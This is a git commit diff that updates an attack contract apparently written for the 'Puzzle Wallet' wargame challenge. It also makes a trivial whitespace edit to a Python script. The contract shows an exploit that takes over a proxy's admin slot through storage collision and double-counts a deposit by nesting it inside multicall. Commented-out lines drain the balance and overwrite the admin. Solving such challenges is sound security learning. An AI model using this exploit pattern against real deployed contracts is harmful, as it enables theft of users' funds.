dd43a0b337c3d13298b6ad58f6d55fe1f63cd5ee
sarobinson2001 <sarobinson2011@gmail.com>
2023-12-02 11:57:37 +0000

    update 24-attack.sol - with Smart Contract Programmer version

--- contracts/24-Puzzle Wallet/24-attack.sol
+++ contracts/24-Puzzle Wallet/24-attack.sol
@@ -19,32 +19,43 @@ contract Attack24 {
         proxy.proposeNewAdmin(address(this));
         target.addToWhitelist(address(this));
 
-        // build deposit and multicall
+        // build: deposit + multicall(deposit)
 
-        bytes memory deposit_sig = abi.encodeWithSignature("deposit()");
-        bytes[] memory deposit_sig_in_array = new bytes[](1);
-        deposit_sig_in_array[0] = deposit_sig;
+        // multicall
+        // 1. deposit
+        // 2. multicall
+        //      - deposit
 
-        bytes memory multicall_sig = abi.encodeWithSignature(
-            "multicall(bytes[])",
-            deposit_sig_in_array
-        );
+        bytes[] memory deposit_data = new bytes[](1);
+        deposit_data[0] = abi.encodeWithSelector(target.deposit.selector);
         
         bytes[] memory data = new bytes[](2);
-        data[0] = deposit_sig;
-        data[1] = multicall_sig;
-        
-        target.multicall{value: address(this).balance}(data);
-        
-        bytes memory transfer_sig = abi.encodeWithSignature(
-            "transfer(int)",
-            address(target).balance
-        );
+        data[0] = deposit_data[0];
+        data[1] = abi.encodeWithSelector(target.multicall.selector, deposit_data);
 
-        target.execute(msg.sender, address(target).balance, transfer_sig);  // <-- here
-        // target.setMaxBalance(uint256(uint160(msg.sender)));
      }
 }
 
 
-  
+        // bytes memory deposit_sig = abi.encodeWithSignature("deposit()");
+        // bytes[] memory deposit_sig_in_array = new bytes[](1);
+        // deposit_sig_in_array[0] = deposit_sig;
+
+        // bytes memory multicall_sig = abi.encodeWithSignature(
+        //     "multicall(bytes[])",
+        //     deposit_sig_in_array
+        // );
+        
+        // bytes[] memory data = new bytes[](2);
+        // data[0] = deposit_sig;
+        // data[1] = multicall_sig;
+        
+        // target.multicall{value: address(this).balance}(data);
+        
+        // bytes memory transfer_sig = abi.encodeWithSignature(
+        //     "transfer(int)",
+        //     address(target).balance
+        // );
+
+        // target.execute(msg.sender, address(target).balance, transfer_sig);  
+        // target.setMaxBalance(uint256(uint160(msg.sender)));
--- scripts/sandbox.py
+++ scripts/sandbox.py
@@ -39,7 +39,4 @@ contract LockDrop() {
 }
 
 
-
-
-
 """
